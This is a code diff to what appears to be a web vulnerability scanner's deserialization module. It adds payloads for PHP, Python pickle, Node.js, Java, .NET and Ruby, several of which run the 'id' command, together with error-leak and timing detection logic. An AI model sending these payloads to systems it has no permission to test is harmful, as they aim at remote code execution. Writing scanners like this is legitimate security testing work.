@@ -403,17 +403,31 @@ func (m *DeserializationModule) Description() string {
 func (m *DeserializationModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
 	var payloads []mutator.Payload
 	raw := []struct{ v, t string }{
-		// PHP
+		// PHP object injection + POP chain markers
 		{`O:8:"stdClass":0:{}`, "php-object"},
 		{`a:2:{s:4:"test";s:4:"test";s:4:"role";s:5:"admin";}`, "php-array"},
-		// Python pickle
+		{`O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}`, "php-pop-chain"},
+		{`O:21:"Monolog\\Handler\\Mock":0:{}`, "php-monolog-gadget"},
+		// Python pickle (os.system reduce)
 		{`gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==`, "python-pickle-b64"},
-		// Java (ysoserial markers)
+		{`cos\nsystem\n(S'id'\ntR.`, "python-pickle-reduce"},
+		// Java serialized magic + ysoserial gadget class markers
 		{"\xac\xed\x00\x05", "java-serialized-magic"},
+		{"rO0AB", "java-serialized-b64"}, // base64 of ac ed 00 05
+		{`org.apache.commons.collections.functors.InvokerTransformer`, "java-commons-collections"},
+		{`org.apache.commons.beanutils.BeanComparator`, "java-commons-beanutils"},
+		{`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`, "java-templatesimpl"},
+		{`org.springframework.beans.factory.ObjectFactory`, "java-spring-gadget"},
+		{`groovy.util.Expando`, "java-groovy-gadget"},
 		// Node.js
 		{`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`, "node-serialize"},
-		// .NET ViewState (marker)
+		// .NET
 		{`/wEPDwUKMTkwNjc4NTIwMWRk`, "dotnet-viewstate"},
+		{`TypeConfuseDelegate`, "dotnet-typeconfuse-gadget"},
+		{`System.Windows.Data.ObjectDataProvider`, "dotnet-objectdataprovider"},
+		// Ruby Marshal
+		{"\x04\x08", "ruby-marshal-magic"},
+		{`Gem::Requirement`, "ruby-gem-gadget"},
 	}
 	for _, point := range points {
 		for _, p := range raw {
@@ -425,19 +439,69 @@ func (m *DeserializationModule) GeneratePayloads(points []input.InjectionPoint, 
 
 func (m *DeserializationModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
 	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
+	bodyLower := strings.ToLower(respBody)
+	baseLower := strings.ToLower(baseBody)
+
+	// Error-leak detection (engine reveals deserialization attempt)
 	deserErrors := []string{
 		"unserialize()", "classnotfoundexception", "java.io.invalidclassexception",
 		"pickle", "unpicklingerror", "deserializationexception", "viewstateexception",
+		"__wakeup", "__destruct", "marshal", "objectinputstream", "readobject",
+		"typeerror: cannot unmarshal", "invalid load key",
 	}
-	bodyLower := strings.ToLower(respBody)
 	for _, e := range deserErrors {
-		if strings.Contains(bodyLower, e) && !strings.Contains(strings.ToLower(baseBody), e) {
+		if strings.Contains(bodyLower, e) && !strings.Contains(baseLower, e) {
+			// Identify likely language/gadget from the payload variant for context
+			gadget := gadgetContext(payload.Variant)
 			return &Finding{Module: "deser", Severity: "high", Confidence: "high",
-				Title: "Insecure Deserialization - Error leak", Payload: payload.Value, Point: payload.Point,
-				Evidence: e, OWASP: "A08:2021 Software and Data Integrity Failures", CWE: "CWE-502"}
+				Title:       "Insecure Deserialization - Error leak (" + gadget + ")",
+				Description: "The application attempts to deserialize attacker-controlled data. Gadget chain context: " + gadget,
+				Payload:     payload.Value, Point: payload.Point,
+				Evidence: "Deserialization indicator '" + e + "' in response",
+				OWASP:    "A08:2021 Software and Data Integrity Failures", CWE: "CWE-502"}
 		}
 	}
+
+	// Time-based: gadget chains that trigger sleep/heavy processing
+	if respTime-baseTime > 4500 && strings.Contains(payload.Variant, "gadget") {
+		return &Finding{Module: "deser", Severity: "high", Confidence: "medium",
+			Title:       "Insecure Deserialization - Time-based gadget (unconfirmed)",
+			Description: "A gadget-chain payload caused a large processing delay.",
+			Payload:     payload.Value, Point: payload.Point,
+			Evidence: "Delay over baseline with gadget payload " + payload.Variant,
+			OWASP:    "A08:2021 Software and Data Integrity Failures", CWE: "CWE-502"}
+	}
 	return nil
+}
+
+// gadgetContext maps a payload variant to a human-readable gadget chain hint.
+func gadgetContext(variant string) string {
+	switch {
+	case strings.HasPrefix(variant, "java-commons-collections"):
+		return "Java CommonsCollections (ysoserial)"
+	case strings.HasPrefix(variant, "java-commons-beanutils"):
+		return "Java CommonsBeanutils (ysoserial)"
+	case strings.HasPrefix(variant, "java-templatesimpl"):
+		return "Java TemplatesImpl bytecode injection"
+	case strings.HasPrefix(variant, "java-spring"):
+		return "Java Spring gadget"
+	case strings.HasPrefix(variant, "java-groovy"):
+		return "Java Groovy gadget"
+	case strings.HasPrefix(variant, "java"):
+		return "Java serialized object"
+	case strings.HasPrefix(variant, "php"):
+		return "PHP POP chain"
+	case strings.HasPrefix(variant, "python"):
+		return "Python pickle __reduce__"
+	case strings.HasPrefix(variant, "dotnet"):
+		return ".NET gadget (ysoserial.net)"
+	case strings.HasPrefix(variant, "ruby"):
+		return "Ruby Marshal gadget"
+	case strings.HasPrefix(variant, "node"):
+		return "Node.js node-serialize IIFE"
+	default:
+		return "unknown"
+	}
 }
 
 // ===== LDAP Injection =====
